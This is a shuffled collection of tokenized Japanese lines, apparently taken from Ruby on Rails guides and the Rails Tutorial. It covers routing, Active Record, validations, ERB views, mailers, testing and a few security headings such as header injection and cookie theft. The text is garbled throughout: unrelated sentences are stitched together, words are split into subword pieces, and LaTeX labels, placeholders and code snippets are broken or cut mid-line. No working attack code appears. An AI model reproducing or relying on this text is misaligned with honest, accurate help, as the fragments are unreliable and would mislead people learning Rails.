▁WARNING : ▁ 等 幅 フォント を ` + ▖▖▖ + ` という マークアップ で 表 記 できる のは 、 通常の メソッド名 、 シンボル 、 パス ▁( 通常の スラッシュ を使用している もの ) ▁ のような シンプルな もの に 限 られます 。
▁* ▁` after _ perform `
▁Web アプリケーションは 突 き 詰 め れば ただ の 文字列 に過ぎません が 、 実際には これらの 文字列を \ emph { 作る } ために 文字列 以外の データ構造 も 必要 となります 。
▁ 削除リンク が 、 現在のユーザー によって 作成 されていない マイクロポスト には 表示 されない ことを確認する ための テスト を作成してください 。
▁リスト \ ref { code : html _ structure } の 基本 HTML 構造 を カスタム の Home ページ ▁( リスト \ ref { code : custom _ home _ page }) ▁ に追加する と ▁( リスト \ ref { code : home _ view _ full _ html } のようになります 。
▁Rails ▁ で ▁JavaScript ▁ を使用する
▁` parent _ name ` メソッドは 、 名前 が ネストした モジュール に対して 実行 でき 、 対応する 定数 を持つ モジュール を返します 。
▁### ▁ ヘッダー インジェクション
▁now ▖ change ( year : ▁2011 , ▁ offset : ▁R ation al ( - 6 , ▁24 ) )
▁╼╼ ▁% ▁subsection ▁a _ working _ form ▁( end )╼╼ ▁\ subsection { S trong ▁Parameters } ▁% ▁( fold )╼ ▁\ label { sec : strong _ parameters }╼╼
▁About ページ のコード
▁ ローカル P C 上の ローカル リポジトリ に 新しい リモート を追加します 。
▁route ▁get ▁" static _ pages / help "
▁* ▁` Rack :: Sendfile ` は 、 body が 1 つの ファイル から 作成 されている レスポンス を キャッチ し 、 サーバー 固有の X - Sendfile ヘッダー に 差し替え て から 送信 します 。
▁これらの 属性 は インスタンス の レベルで アクセス または オーバーライド できます 。
▁最初の 状態 に 戻 したい場合は 、 以下の コマンド を使います 。
▁今度は イベント を 活用 して 改良 してみましょう 。
▁validates ▁: legacy _ code , ▁format : ▁ { ▁with : ▁ / \ A [ a - z A - Z ] + \ z / ,
▁# ▁root ▁' welcome # index '
▁ 経験 上 、 残念ながら マ イ ナ ー アップグレード です ら 問題 を 引 き 起こ す ことがあります ▟ このため 、\ emph { Rails チュートリアル } では 基本的に 事 実 上 すべての gem で バージョン を 「 ピ ン ポイント で 」 指定 しています 。
▁ コントローラ については 第 \ ref { cha : a _ toy _ app } 章 でも 簡単に触れ ましたが 、 第 \ ref { cha : modeling _ users } 章 で説明する \ href { http :// en ▖ w ikipedia ▖ org / wiki / Re presentational _ State _ Transfer } { REST ▁ アーキテクチャ } を 読む と 理解 が 深 まり ます ▟ 一 言 で言う と 、 コントローラと は ▁( 基本的に 動的な ) ▁Web ページの 集合 を 束 ね る コンテナ の ことです 。
▁< title > A ▁simple ▁page </ title >
▁ 無効な 情報を ユーザー登録フォーム で 送信 した結果
▁` has _ one ` 関連付け に オブジェクトを ア サ イン し 、 しかも そのオブジェクト を 保存 したくない場合 、` association ▖ build ` メソッド を使用してください 。
▁* ▁` config ▖ active _ record ▖ schema _ migrations _ table _ name ` は 、 スキーマ マイグレーション テーブル の名前 として 使用する 文字列 を指定します 。
▁この アプリケーションを 共有 ホスト か 専 用の サーバー に 本番 展開 する のであれば 、\ href { http :// free la n c ing - g o d ▖ github ▖ com / t s / en /}{ Thin k ing ▁S ph in x } の 導 入 を お勧め します ▁( RailsCast 「\ href { http :// r ailscasts ▖ com / episodes /1 20 - th in k ing - s ph in x } { Thin k ing ▁S ph in x } ▁( 英語 )」 も 参 照 してください ) 。
▁CSS ルール では 一般に 、 クラス 、 id 、 HTML タグ 、 または それらの 組み合わせ 、 のいずれか を指定します ▟ そして その 後ろに ス タ イ リ ング コマンド の リスト を記述し ます 。
▁Set - Cookie : ▁ _ blog _ session = ▖▖▖ s n ip ▖▖▖ ; ▁path = / ; ▁ Http Only
▁* ▁Rails ▁4▖0 では uni code 文字 のルーティング の 描 出 方法 が変更され ました 。
▁この ルーティングヘルパー では id を指定する 必要 がない 点にご注目ください 。
▁### ▁ 高度な 制限
▁Microposts コントローラ 自体 の 構造 を {0}{1} リスト 2▖ 9 {/1}{/0} に示します 。
▁\ k ode { t } オブジェクトが 具体的に 何 を している のか を 正確に 知 る 必要はありません ので 、 どう か 心 配 しないでください ▟\ emph { 抽 象 化 レ イ ヤ } の 素晴らしい 点 は 、 それが 何 である か を知る 必要 がない という 点 です 。
▁### ▁ 条件 付き バリデーション を グループ 化 する
▁ マイクロポスト が表示され た プロフィール ページのモックアップ
▁リスト \ ref { code : basic _ signup _ tests } のとき
▁d ▖ advance ( years : ▁1, ▁ months : ▁1, ▁day s : ▁1, ▁hours : ▁1, ▁minutes : ▁1, ▁second s : ▁1)
▁< li >`: sendmail ` ▁-- ▁` config ▖ action _ mailer ▖ sendmail _ settings ` で 設定 可能 ▟ </ li >
▁` Article sController ` コントローラに ` new ` メソッド を作成して から ブラウザで < http :// localhost :3000/ articles / new > を再 表示する と 、 今度は また 違 う エラーが表示され ます 。
▁<%= ▁f ▖ label ▁: author _ name ▁%>< br >
▁[] ▖ sum ▁# ▁=> ▁0
▁* ▁` test _ framework ` は 、 使用する テスト フレームワーク を指定します 。
▁ 現在 は 、 / users の ユーザーインデックスページ を開く と \ emph { すべての } ユーザー が表示され 、 / users / : id のように ID を指定すると 個 別の ユーザーを 表示 できます ▟ しかし 考え て み れば 、 有効 でない ユーザーは 表示する 意味 が ありません 。
▁\ k ode { edit } アクション を使い たい のです から 、 コマンドラインで \ k ode { edit } と 指定 すれば よい ように 思 えます が 、 そう すると 使い も しない edit ビュー や テスト まで 生成 されてしまう のです 。
▁ コードを 実際に 書く 前に 、 パスワード再設定の 想 定 手順を モックアップ ▁( = ス ク リ ー ン シ ョ ッ ト 画像 を 改 変 して 作 った 模 型 ) ▁ で 確かめ ましょう 。
▁| ▁GET ▁| ▁ / comments / : id (▖ : format ) ▁| ▁comments # show ▁| ▁ sekret _ comment _ path ▁|
▁ 著者 の場合 、 以下 をインストール する必要が あり ました ▁( ここでは \ href { http :// m x c l ▖ github ▖ com / home brew /}{ Home brew } という M ac ▁OS ▁X 用の パッケージ 管理 システム を使用しています ) 。
▁` nil ` を指定すると ログ出力 を行わ なくなります 。
▁is e ' ▁id =' ex - ad 9 fd 0 ' ></ span >╼╼ \ end { enumerate }╼╼ ╼ ▁% ▁subsection ▁signup _ error _ messages ▁( end )╼╼ ╼ ▁\ subsection { 失敗 時の テスト } ▁% ▁( fold )╼ ▁\ label { sec : a _ test _ for _ invalid _ submission }╼╼
▁# ▁=> ▁Mon , ▁09 ▁A ug ▁2010 ▁23:2 0 : 05 ▁UTC ▁+00:00
▁たとえば 、` app / controllers / admin ` に置かれている ` Admin Product s ` コントローラの コードを 実行 している と すると 、` app / views / products ` に置かれている ビューテンプレート に対する アクション の実行 結果を 出力する には 以下のように します 。
▁ u c to r ▁using ▁the ▁\ k ode { Range } ▁class ▁and ▁the ▁\ k ode { new } ▁method ? ▁\ emph { Hint } : ▁\ k ode { new } ▁take s ▁two ▁arguments ▁in ▁this ▁context ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 7 3 1 58 e ' ></ span >╼╼ ▁\ item ▁C on fi rm ▁using ▁the ▁\ k ode {==} ▁operator ▁that ▁the ▁literal ▁and ▁named ▁construct or s ▁from ▁the ▁previous ▁two ▁ exercises ▁are ▁identical ▖╼ %= ▁< span ▁class =' exercise ' ▁id =' ex - 4 d 8 c 3 d ' ></ span >╼╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁construct or s ▁( end )╼╼ ▁\ subsection { クラス 継 承 } ▁% ▁( fold )╼ ▁\ label { sec : a _ class _ of _ our _ own }╼╼
▁Article ▖ none ▁# ▁ 空の リレーション を返し 、 クエリ を生成し ない 。
▁ このような ときは 、「 generate 」 という 言葉 に 因 んで 、\ text tt { rails ▁destroy } という コマンドを実行 することで 元に戻す ことができます 。
▁これにより 多くの 利 点が 得られます 。
▁また 、 Ruby ▁ には 特有の ク セ が あるので 、 これも 本書 で 初めて 触れ る 知識 になる でしょう 。
▁` extract !` メソッドは 、 与えられた キー に マッチする キー / 値 ペ ア を 取り 除 き 、 取り 除 いた ペ ア を返します 。
▁### ▁ テンプレート
▁ユーザー ID を cookies に保存 するには 、\ k ode { session } メソッド で使用した の と同じ パターン ▁( リスト \ ref { code : log _ in _ function }) ▁ を使用します ▟ 具体的に は以下のようになります 。
▁ 以下を実行して 変更を コミット できます 。
▁ アプリケーションは 、 ページ ごとに 以下の 呼び出し を行います 。
▁<% ▁if ▁pages ▖ many ?
▁NOTE : ▁ 実際の レンダリング は 、` ActionView :: Template H and ler s ` の サブクラス で 行われます 。
▁ このように 変更 される と 、 すべての 記事 に タイトル が存在し 、 その 長さ が 5 文字 以上 であること が 保 証 されます ▟ そうでない 場合には 記事 は データベースに保存 されません 。
▁ただし 、 今 はまだ \ k ode { app / views / shared } といった ディレクトリ は 作 って い ないので 、 表 \ ref { table : uni x _ commands } で紹介した \ k ode { mkdir } コマンド を使い 、 新しく ディレクトリ を作成する必要があります 。
▁` config ▖ active _ support ▖ d eprecation ` に 値が 設定 されていない 場合 、 この イニシャライザ は 、 現在の 環境 に対応する ` config / environments ` ファイルに 値 を設定する よう 促 す メッセージ を出力します 。
▁このコードは リスト \ ref { code : user _ pages _ spec } で使用されていました ▟ もうひとつ 、
▁ アプリケーションで アセットパイプライン を使用 せずに jQuery ▁JavaScript ライブラリ を インクルード する 場合は 、 ソース として `: default s ` を渡して ください 。
▁ユーザーの 有効化 が 役に立 つ ためには 、 ユーザーが 有効 である 場合にのみ ログイン できるように ログイン 方法 を変更 する必要があります 。
▁# ▁=> ▁ActiveRecord :: RecordInvalid : ▁Validation ▁failed : ▁ 空欄 には できません
▁この場合 、 ホスト アプリケーションでは ` admin ▖ css ` や ` admin ▖ js ` は 不要 です 。
▁( 読者 の \ href { http :// get satisf action ▖ com / railstutorial / to p ic s / adding _ methods _ to _ built _ in _ classes _ com p ar able _ to _ using _ javascripts _ proto type _ object } { E ri k ▁E ld r id ge } による 指 摘 に 感 謝 します ) 。
▁### ▁ Form Options Helper
▁# ▁=> ▁[" 私 は David ", ▁" 私 は Jeremy ", ▁" 私 は J o se "]
▁ユーザー登録 機能 の実装 は 、 私 た ち の サンプルアプリケーション にとって 大きな マ イ ル スト ー ン でした 。
▁( end )╼╼ ▁\ subsection { ユーザーの 作成 と 認 証 } ▁% ▁( fold )╼ ▁\ label { sec : creating _ and _ authenticating _ a _ user }╼╼
▁Oh ▖▖▖"
▁<%= ▁raw ▁@ cm s ▖ current _ template ▁%> ▁<% # ▁@ cm s ▖ current _ template をそのまま 挿 入 ▁%>
▁` select ` タグ と 、` object ` が 属 する クラスの メソッド 値 の 既存の 戻り値 を コレクション にした ` option ` タグを返します 。
▁Rails アプリケーションが 以下の HTTP リクエストを 受け取った とします 。
▁alias _ method ▁: process , ▁: process _ with _ stringified _ params
▁もし 仮 に \ k ode { index } アクション を追加し 、 サインイン していない ユーザー でも アクセス可能 に したい場合は 、 以下のように index アクション 以外の アクション を明示的に指定 する必要があります 。
▁#### # ▁` beginning _ of _ month `、` end _ of _ month `
▁next _ month
▁ アプリケーションの {0} Gemfile {/0} の内容を リスト { p 1 } で 置き換え たら 、 {0} bundle ▁install {/0} を実行して gem をインストール します
▁ ブロック を 渡 さ ない場合 、 引数として 受け取った 値が セ パ レ ー タ として 使用されます ▟ デフォルトの セ パ レ ー タ は ` nil ` です 。
▁1 番目の ときと同様 、\ k ode { generate } を実行して 、 現 時点 での 要求 である 新規ユーザー 用の サインアップ ページ ▁( ス タブ ) ▁ を持つ 、 最も 簡単な コントローラ を作成します 。
▁</ pre >
▁この ハッシュ は Users コントローラに \ k ode { params } として 渡 さ {1} {/1} れ ます ▟ {2} 7 ▖ 1 ▖ 2 {/2} で 説明したとおり 、 この \ k ode { params } ハッシュ {1} {/1} には 各 リクエスト の 情報 が含まれています 。
▁### ▁` exclude ?
▁Client ▖ where (" orders _ count ▁> ▁10 ")▖ reverse _ order
▁# ▁=> ▁Thu , ▁ 05 ▁A ug ▁2010 ▁ 11 : 3 3 : 3 1 ▁+0000
▁ { a : ▁1, ▁b : ▁2}▖ except (: a ) ▁# ▁=> ▁ { : b =>2}
▁* ▁` routes ▖ rb ` のコード の 読み 方
▁ transform _ keys ▁ { ▁| key | ▁key ▖ to _ sy m ▁ rescue ▁key ▁ }
▁Last ▁name ▁: ▁<%= ▁person _ form ▖ text _ field ▁: last _ name ▁%>
▁この 手順 が 必要となる のは 、 Rails ▁gem のバージョン を変更 した 場合に 限 られます ▟ おそらく Rails インストーラ を使用している場合 に しか こう い う ことは 起こ らない でしょう ▟ 他の 場合に この 手順 を実行して も 大丈夫 です 。
▁ Cloud 9 で インデント を スペース 2 つ に設定する 。
▁#### ▁` render ` で `: inline ` オプション を使用する
▁また 、 Sprockets は ` Cache - Control ` ▁HTTP ヘッダー を ` max - age = 3 15 36 000 ` に 変更します 。
▁ テンプレート ビュー は 、 通常の ビュー と同様 ERB で 自由に カスタマイズ できます ▟ ここでは 挨拶 文 に ユーザー名 を含め 、 カスタム の 有効化 リンク を追加します 。
▁` first ` メソッドは 、 主キー 順 の最初の レコード を取り出し ます 。
▁続いて ` app / views / articles / show ▖ html ▖ erb ` の内容 を以下のように変更し ましょう 。
▁# ▁< contributors >
▁ 特定の 属性 のみ を更新する 必要がある 場合は 、 以下のように \ k ode { update _ attribute } を 単 発 で 使用 して 制限 を 回 避 する必要があります 。
▁ 慣習 的に 正しく マイクロポスト を作成する
▁ インスタンス変数 \ k ode {@ current \_ user } を \ k ode { nil } にする 必要がある のは 、\ k ode {@ current \_ user } が \ k ode { destroy } アクション より 前に 作成 され ▁( 作成 されていない 場合 ) 、\ emph { かつ } 、 リダイレクト を直接 発行し なかった場合 だけです ▟ 今回は リダイレクト を直接 発行し ているので 、 不要 です 。
▁ 読み 込 まれ た ミドルウェア の 役 割 は 下 表 のとおり です 。
▁この 他 に バ イン ド 可能な イベント など の詳細については 、[ Turbolinks ▁README ]( https :// github ▖ com / rails / turbolinks / blo b / master / README ▖ md ) を参照してください 。
▁\ ref { sec : a _ hashed _ password } で 説明したように 、\ k ode { has \_ secure \_ password } で bcrypt パスワードが 作成される ので 、 同じ 方法で フィクスチャ 用 パスワード を作成します 。
▁ 文字列を 引数に 取 る メソッドを 作る ため だけ に 、 わざわざ 新しい クラスを 作る のは 変 です 。
▁# ▁=> ▁Mon ▁Oct ▁ 18 ▁00:00:00 ▁UTC ▁ 1582
▁Active ▁Record オブジェクト に 関連付け られる コンテナ タグ を出力します 。
▁ セッション を実装する には 、 様々な コントローラ や ビューで お び ただし い 数 の 関数 を定義する 必要があります 。
▁リスト \ ref { code : demo _ users _ controller _ class } と リスト \ ref { code : demo _ microposts _ controller _ class } を 比較してみると 、 Users コントローラと Microposts コントローラは いずれも Application Controller を継承し ています 。
▁ 有効なメールアドレス かどうか ▁( ドット が 2 つ 以上 連続 する かどうか ) ▁ を検証する 正規表現
▁ jQuery を使用する のであれば 、 たとえば 以下のような コードを 書くこと がある でしょう 。
▁User モデル に対して \ k ode { has _ secure _ password } を追加する 利 点 は \ ref { sec : creating _ and _ authenticating _ a _ user } で 少しだけ 説明します が 、 ▁ その前に 、 パスワード の 最 小文字 数 を設定する 方法 について説明します 。
▁ 安全 である と 宣言 された 文字列 に対し 、 安全 でない 文字列を ` concat ` / ` << ` または ` + ` を使用して 破 壊 的 に追加する と 、 結果は 安全 な 文字列 になります 。
▁ 幸 い 、 この問題 は既に 解決 されています ▟\ ref { sec : creating _ and _ authenticating _ a _ user } で Rails コンソール を使用して ユーザー レコードを 登録 して あり ました ▟ したがって 、 データベース の中に 一 人のユーザー が い る はずです 。
▁Active ▁Record は 、 基本的な データベース CRUD ▁( Create 、 Re ad 、 Update 、 Destroy ) ▁ 操作 、 データ の検証 ▁( バリデーション ) 、 洗 練 された 検索 機能 、 複数の モデルを 関連付け る ( リレーションシップ ) ▁ など 、 きわめて 多くの 機能を Rails モデルに 無 償 で 提供し ています 。
▁ ユーザーがログイン 中の 状態 とは 、 セッション に ユーザー が存在する 、 つまり \ k ode { current _ user } が \ k ode { nil } でない ということです 。
▁Rails は 、 追加される オブジェクト や 削除 される オブジェクトを コールバック に ( 引数として ) 渡します 。
▁`: source _ type ` オプションは 、 ポリモーフィック関連付け を 介 して 行われ る ` has _ one ▁: through ` 関連付け における 「 ソース の 」 関連付け タイプ 、 つまり 関連付け 元の タイプ を指定します 。
▁ 継 承 の関係 を 図 \ ref { fig : static _ pages _ controller _ inheritance } に示します 。
▁# ▁ David という 名前を持つ 最初の ユーザー を返す
▁この 作業 には ある程度 の リファクタリング が必要 なので 、 テスト を作成して バグ の 再 発 を キャッチ する ようにします 。
▁ AND ▁ locked ▁= ▁? ", ▁params [: orders ] , ▁false )
▁This ▁is ▁the ▁ home ▁page ▁for ▁the
▁def ▁change
▁たとえば 、 図 \ ref { fig : cloud 9 _ gemfile }, を もう一度 見 てみると 、 コードを 80 文字 以下 に 抑 え るため の 小さな 縦 線 が 右 側 に見えます 。
▁ 例外
▁#### ▁password _ field _ tag
▁ テストが 失敗する 理由は 、\ ref { sec : a _ hashed _ password } で 触れ た ように \ k ode { has _ secure _ password } には 、 仮 想 的な \ k ode { password } 属性 と \ k ode { password _ confirmation } 属性 に対して バリデーション を する 機能 も ( 強制的に ) 追加 されている からです ▟ しかし リスト \ ref { code : validates _ uniqueness _ of _ email _ case _ insensitive _ test } の テストでは 、\ k ode {@ user } ▁ 変数 に このような 値が セット されており ません 。
▁ / photos /1/ change
▁validates ▁: name , ▁: login , ▁: email , ▁absence : ▁true
▁# ▁Ruby ▁on ▁Rails チュートリアル : ▁ サンプルアプリケーション ╼╼ これは 以下 に 基 づ いた サンプル ・ アプリケーション です ╼[ * Ruby ▁on ▁Rails チュートリアル : ╼ 実 例 を使って Rails を 学 ぼ う * ]( http :// railstutorial ▖ jp / ) ╼[ Michael ▁Hartl ]( http :// www ▖ michael hartl ▖ com / ) 著
▁たとえば 、 Users コントローラの \ k ode { create } アクション では \ k ode {@ user } という インスタンス変数 が 定義 されています ▁( リスト \ ref { code : user _ signup _ with _ account _ activation }) ▁ ので 、 テストで \ k ode { assigns (: user )} と すると この インスタンス変数 にアクセス できるようになります 。
▁この 区別 は この章 において は 重要 ではありません が 、\ ref { sec : rails _ environments } で これらの 環境 について 詳 細 に 説明します 。
▁ ヒント : ▁リスト \ ref { code : full _ title _ helper _ tests } では \ k ode { assert _ equal ▁< 期 待 される 値 > , ▁< 実際の 値 > } といった 形で 使って いました が 、 内部で は \ k ode {==} 演算子 を使って 、 期 待 される 値 と 実際の 値を 比 較 して 正しい かどうか テスト しています 。
▁上の ` customer ` パーシャル 呼び出し では 、` customer ` ローカル変数 は 親 の ビューの `@ new _ customer ` 変数 を指します 。
▁* ▁` after _ add `
▁ これはリスト \ ref { code : respond _ to _ password _ digest } で使用されていました 。
▁ これまで と同様 、 開発 と 同時に テスト も 作成します ▟ RSpec と Capybara の 適用 範囲 を 拡大 し 、 簡潔 かつ 表現 力 豊 か な 結合テスト を作成します 。
▁` head ` メソッドを使用することで 、 ヘッダ だけで 本 文 ▁( body ) ▁ の ない レスポンス を ブラウザに送信 できます 。
▁` render ` の `: status ` オプション の場合と同様 、` redirect _ to ` の `: status ` も ヘッダー を指定する 時に 数値 の他に シンボル も使用できます 。
▁ユーザーの \ k ode { show } ページ で マイクロポスト が表示されている こと をテストする 。
▁file _ field (: user , ▁: avatar )
▁> ▁ puts ▁ ENV [' DAT A BASE _ URL ']
▁resources ▁: photos , ▁: books , ▁: video s
▁以下の ステップ 定義 によって 扱 われます 。
▁ インライン コールバック ブロック で ` return ` 文 を書く と 、 コールバック 実行時に ` Local J um p Error ` が発生する ようになりました 。
▁root ▁' welcome # index '
▁* ▁` has _ one `
▁orders ▖ empty ?
▁ 実際の 比 較 では 、\ k ode {==} の代わりに \ k ode { is \_ password ?} という 論理値 メソッド が使用されています 。
▁置き換えた結果を {0}{1} リスト 4 ▖3{/1}{/0} に示します 。
▁ 開発 ログ ▁( log / development ▖ log ) ▁ を tail ▁- f した まま 上 を実行して い た場合 、 実行 後に 新しい 行 が 何も 表示され ないこと に 気付いた方もいると思います 。
▁ 普通 の アプリケーション であれば 、 記事 や コメント の 作 者 を表す ための ` User ` クラス が 備 わ っている でしょう 。
▁また 、 この fixture は {0}{1} 第 8 章 {/1}{/0} になる まで 使わない 予 定 なので 、 今 の ところ は これらの データを 削除 しておき 、 ユーザー用の fixture ファイルを 空 に しておきましょう ▁( リスト \ ref { code : empty _ fixtures }) 。
▁ 相手 ではなく 自分の クラス が 外部キー を持っている のであれば 、` belongs _ to ` を使う べ き です 。
▁StaticPages コントローラの テスト ▁( リスト \ ref { code : title _ tests }) ▁ にも 重複 がある ことに お 気 付き でしょうか 。
▁=> ▁ Abstract Controller :: Base
▁もちろん 、 攻撃者 に してみ れば 標的ユーザー が 自分で 自分の cookie を表示し た ところで 何 の 意味 も ありません 。
▁Web 開発 を 最初から 体 系 的に 学 び たい 方 や 、 プログラミング の 経験 が 全 く ない 方は 、 や は り \ href { http :// p ra g prog ▖ com / book / lt p 2 / learn - to - prog ra m }{\ emph { Ruby を 最初に 学 んで お く } } のが よいでしょう ▟ P eter ▁Cooper の 『 \ href { http :// www ▖ a mazon ▖ com / gp / product / 14 3022 36 34 }{\ emph { B eginning ▁Ruby } } 』 がお勧めです 。
▁### ▁ テスト ヘルパー の 変更
▁ パス スコープ を使用する ルーティング 同士 で の名前 の 衝 突 を 避 け たい場合 に 使用 してください 。
▁このとき Active ▁Record は 、\ k ode { user \_ id } が \ k ode { first \_ user } の id ▁( ここでは \ k ode {1} ) ▁ と 等 しい マイクロポストを 自動的に 返します 。
▁id : ▁" Home Image ",
▁#### ▁ ERB
▁ メール フォーマット を 正規表現 で 検証 する
▁` attachments [' file - name ▖ jpg '] ▁= ▁File ▖ read (' file - name ▖ jpg ') ` の よう に記述 します 。
▁resources ▁: ads
▁ n ▁class =' exercise ' ▁id =' ex - d f 8 f b d ' ></ span >╼ \ end { enumerate }╼╼ ▁% ▁subsection ▁rendering _ microposts ▁( end )╼╼ ▁\ subsection { マイクロポストの サンプル } ▁% ▁( fold )╼ ▁\ label { sec : sample _ microposts }╼╼
▁ そして 、 cookies から この トークン を 読み だ して 暗号化 し 、 データベース 上 にある 暗号化 された 記憶トークン と 一致する もの がある かどうか を検索する ことにより 、 ユーザーを 自動的に サインイン させる ことができます 。
▁* 自分の 名前 *
▁\ k ode { rails ▁new } を実行して アプリケーション を新規作成する 。
▁この チュートリアル 構成 は 、 Michael ▁E ra s m us による 素晴らしい ブログ 記事 「\ href { http :// 2 be ar d s ▖ net / 20 11 / 11 / the - rails - 3- asset - pipeline - in - about - 5 - minute s /}{ 5 分 で わ か る Rails ▁3 の Asset ▁Pipeline } ▁( 英語 )」 を も と に しています 。
▁#### # ▁ Cookie 窃 盗
▁ それ だけ の こと か と 思 わ れる かもしれませんが 、 これは 今後 マイクロポスト を実装する ときに 問題 となります ▟ なお 、 この問題 については \ ref { sec : ordering _ and _ dependency } で 解決 していきます 。
▁if ▁boolean ?
▁\ href { https :// tutorial s ▖ rails app s ▖ org / hartl } { Rails App s } : ▁ さまざまな Rails プロジェクト や チュートリアル が トピック 別 に 詳 しく 特 集 されています 。
▁### ▁ Form Helper
▁ 本番環境で 動作する ステータスフィード は以下のようになります ▁( 図 \ ref { fig : li ve _ status _ feed }) 。
▁ 「 はじめ に 」 で 述べたように 、\ emph { Rails チュートリアル } では 最初から テスト駆動開発 ▁( TDD ) ▁ を採用し ています ▟ その 理由は 、 著者 の開発 経験 に 基 づ き 、 テスト駆動開発 こ そ が Rails アプリケーションの 開発 に 最も 適切な 手法 だと 考え られる からです ▟ ただし 、 テスト駆動開発 を 全 面 的に 採 用 した ことにより 、 本チュートリアル はその 分 複 雑 になり 、 読者 の 負 担 も 増え ています ▟ Rails のコード だけで なく 、 テストコード も 書 か なく て いけない からです 。
▁has _ many ▁: orders , ▁foreign _ key : ▁" c us t _ id "
▁Microposts コントローラの \ k ode { destroy } アクション をテストする 。
▁< h 1> Listing ▁articles </ h 1>
▁( な ぜ スペース を 置く ようになった のか は わ か り ません ▟ おそらく 初期 の 有 力 な ▁Ruby プログラマ が 好 んだ 結果 、 慣習 と な った の でしょう ) 。
▁ ちなみに 、 リスト \ ref { code : _ format _ jquery _ file _ test } のような コード では 大 き すぎる ファイルの アップロード を 完全に は 阻 止 できない 、 という 点を 覚え て おいてください 。
▁それでは 、 Ruby と Rails をインストール しましょう 。
▁ あ とは 、 正しい 数 かどうかを確認 するために 、\ k ode { assert \_ match } メソッド ▁( リスト \ ref { code : user _ profile _ test }) ▁ を使って プロフィール画面 のマイクロポスト 数 をテストします 。
▁ 今は ログイン しても 画面 表示 が 何も 変 わ ら ないので 、 ユーザーがログイン 中 かどうか は 、 ブラウザ セッション を直接 確認し ない限り わ か り ません 。
▁ 注 釈 付き の \ k ode { title _ helper } ▖
▁この 動作を 無効 に するには 、 以下の 設定 を使用します 。
▁attributes ▁= ▁{}) `
▁#### ▁` has _ and _ belongs _ to _ many ` の スコープ について
▁図 \ ref { fig : stats _ partial _ mockup } の 統 計 情報 には 、 現在のユーザー が フォローしている 人 数 と 、 現在の フォロワー の 人 数 が表示され ています ▟ それぞれの 表示 は リンク になっ ており 、 専 用の 表示 ページに 移動 できます 。
▁Rails では 、 新しい フォームの 送信 先 となる アクションは " create " にする のが普通です ので 、 それ に従って 送信 先 を変更 しましょう 。
▁Rails アプリケーションでは 、\ text tt { POST } リクエスト は 何か を \ emph { 作成する } ときに よく使われます ▁( なお 本 来 の HTTP では 、\ text tt { POST } を 更新 に 使って も よい と しています )▟ たとえば 、 ユーザー登録フォーム で 新しい ユーザー を作成するとき は 、\ text tt { POST } リクエストを送信し ます 。
▁ 内部 メソッド や 内部 クラスの 可視性 が private になって い ない場合は 、`: no doc : ` オプション を指定する ことを 推 奨 します ▁( なお 可視性 が private の場合 はデフォルトで 内部 扱 い になります ) 。
▁### ▁ デバッグ をオフに する
▁Microposts コントローラの 各 アクションに 認可 を追加する
▁Rails における デフォルトの 複数形 の慣習 に 従 えば 、 ある ユーザーを フォローしている すべての ユーザーの 集合 は \ emph { followers } となり 、\ k ode { user ▖ followers } は それらの ユーザーの 配列 を表す ことになります 。
▁` re where ` の代わりに ` where ` を 2 回 使用する と 、 結果 が異なります 。
▁これは 、 User オブジェクトを 作成 したときに 、\ k ode {" foobar "} という 文字列 が ハッシュ化 された 結果 です 。
▁{0} 図 1 ▖ 17 ▁{/0}{1} Markdown d で フォーマット された 改良 版 \ k ode { README } ファイル {/1}
▁class ▁ Account ▁< ▁ActiveRecord :: Base
▁ ちなみに \ emph { digest } という 言葉 は 、\ href { http :// en ▖ w ikipedia ▖ org / wiki / C ry p to gr a ph ic _ hash _ function } { 暗号化 用 ハッシュ 関数 } という 用 語 が 語 源 です 。
▁ テスト 環境で 画像 の リ サイズ 処理を スキップ する
▁ 英語
▁ コントローラで \ k ode { params [: email ]} から メールアドレスを 取り出す ときには 、 自動的に エスケープ を 解除 してくれます 。
▁ その他の あらゆる Ruby の オブジェクトは 、 ゼロ です ら \ emph { true } です 。
▁ ユーザー一覧ページ では 、 すべての ユーザーを ページ 毎 に 分割 して 表示する
▁ コントローラで HTML などの メール コンテンツ を生成し て 顧客 に 送信 したい場合 、 その 箇所 で メイラー を使用して 、 送信 したい メッセージ を作成します 。
▁* ▁` config ▖ con side r _ all _ request s _ local ` は フラグ です 。
▁" my _ image - 23 1 a 6 80 f 2 38 87 d 9 d d 7 07 10 ea 5 e fd 3 c 6 2▖ png "} }
▁ 他にも 変更 を行います 。
▁ モジュール は 名前を持つ ことも 、 無名 で い ることもできます 。
▁ 画像アップロード 機能 を追加する ためには 、2 つの 視 覚 的な 要素 が必要です ▟ 1 つ は 画像 を アップロード するための フォーム 、 もう 1 つ は 投 稿 された 画像 その ものです 。
▁ 特に 、 末尾に オプション の ハッシュ を 置く という のは 定 番 中の 定 番 です 。
▁config ▖ relative _ url _ root ▁= ▁"/ app 1 "
▁ エディタ で ` config / routes ▖ rb ` を開いて ください 。
▁x ▁= ▁x ▁+ ▁1
▁\ ref { sec : a _ proto _ feed } で Home ページに は既に フィード を追加して いた ことを思い出してください ▟ ▁ 思い 出 す キ ッ カ ケ として 、\ k ode { home } アクションは リスト \ ref { code : real _ feed _ instance _ variable } に 再 掲 します 。
▁* ▁` active _ record ▖ logger `: ▁` Rails ▖ logger ` に対する 設定 が行われていない 場合に ` ActiveRecord :: Base ▖ logger ` を設定します 。
▁Rails で 自動的に 読み込まれる クラス と モジュール は 、` underscore ` メソッドを使用して ファイルの 拡張子 を 除 いた 相 対 パス を推測し 、 指定された 定数 が 失われ ている 場合に それ を定義する の に 役 立 て ます 。
▁これにより \ k ode { annotate } コマンド が 使える ようになります ▟ これ を実行すると 、 モデル ファイルに データモデル を 含 んだ コメント が追加され ます 。
▁従って 、 Scaffold では ▁(\ k ode { Users } ではなく ) ▁\ k ode { User } と 指定します 。
▁=> ▁" Michael ▁Hartl "
▁ ローカライズ された ビュー
▁CSS は 、 CSS クラス と id を使って レイアウト や デザイン を 調 整 します
▁resources ▁: messages , ▁concern s : ▁: comment able
▁* ▁` config ▖ eager _ load _ namespace s ` を使用して 登録 した 名前 は 、` config ▖ eager _ load ` が true の ときに 読み込まれます 。
▁config ▖ action _ mailer ▖ delivery _ method ▁= ▁: smtp
▁ 著者 の場合 、 デフォルトの RDoc を編集する ときには 主 に \ href { http :// d ar ing fi re b all ▖ net / projects / m ar k d own /}{ Markdown } という マークアップ 言語 を使用しています ▟ 拡張子 を \ k ode { ▖ md } に しておけば 、 GitHub に アップロード したときに 自動的に ドキュメント が き れ い に 整 形 されます 。
